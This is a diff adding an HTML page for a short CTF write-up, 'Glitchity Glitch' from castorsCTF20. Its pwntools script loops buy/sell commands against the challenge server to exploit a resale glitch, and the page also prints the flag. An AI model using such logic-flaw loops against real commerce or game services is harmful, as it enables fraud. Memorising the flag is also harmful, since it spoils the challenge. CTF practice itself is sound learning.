@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Glitchity Glitch :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="For getting the flag in this challenge we have to have lots of money. For this we can buy VPN, then sell it and because of the glitch we can sell it again and again! So let&amp;rsquo;s write a script for earning money.
+from pwn import * conn = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14432) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) conn.sendline(&amp;#34;6&amp;#34;) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) for i in range(1020): conn.sendline(&amp;#34;0&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) conn.sendline(&amp;#34;1&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) print(i) conn.interactive() Flag: castorsCTF{$imPl3_sTUph_3h?}" />
+<meta name="keywords" content="blog" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/writups/castorsctf20/glitchity_glitch/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="" />
+
+<meta name="twitter:creator" content="tozkoparan (Ahmed Selim Üzüm)" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Glitchity Glitch :: Blog">
+<meta property="og:description" content="For getting the flag in this challenge we have to have lots of money. For this we can buy VPN, then sell it and because of the glitch we can sell it again and again! So let&amp;rsquo;s write a script for earning money.
+from pwn import * conn = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14432) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) conn.sendline(&amp;#34;6&amp;#34;) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) for i in range(1020): conn.sendline(&amp;#34;0&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) conn.sendline(&amp;#34;1&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) print(i) conn.interactive() Flag: castorsCTF{$imPl3_sTUph_3h?}" />
+<meta property="og:url" content="/writups/castorsctf20/glitchity_glitch/" />
+<meta property="og:site_name" content="Glitchity Glitch" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Ahmed Selim Üzüm
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://github.com/ahmedselim2017">Github</a></li>
+        
+      
+        
+          <li><a href="/writups">CTF Writups</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>English ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="/">English</a></li>
+        
+        <li><a href="/tr/">Türkçe</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://github.com/ahmedselim2017">Github</a></li>
+      
+    
+      
+        <li><a href="/writups">CTF Writups</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="/">English</a>
+          </li>
+        
+          <li>
+            <a href="/tr/">Türkçe</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/writups/castorsctf20/glitchity_glitch/">Glitchity Glitch</a></h1>
+  <div class="post-meta">
+    
+    
+    <span class="post-author">::
+      tozkoparan (Ahmed Selim Üzüm)
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="/tags/coding/">coding</a>&nbsp;
+    
+    #<a href="/tags/castorsctf20/">castorsCTF20</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>For getting the flag in this challenge we have to have lots of money. For this
+we can buy VPN, then sell it and because of the glitch we can sell it again and again!
+So let&rsquo;s write a script for earning money.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14432</span>)
+<span style="color:#66d9ef">print</span>(conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choice:&#34;</span>))
+conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;6&#34;</span>)
+<span style="color:#66d9ef">print</span>(conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choice:&#34;</span>))
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1020</span>):
+    conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;0&#34;</span>)
+    conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choice:&#34;</span>)
+    conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+    conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choice:&#34;</span>)
+    <span style="color:#66d9ef">print</span>(i)
+conn<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Flag: <code>castorsCTF{$imPl3_sTUph_3h?}</code></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/writups/castorsctf20/gif/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Gif</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/writups/castorsctf20/leftovers/">
+                <span class="button__text">Leftovers</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Ahmed Selim Üzüm</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
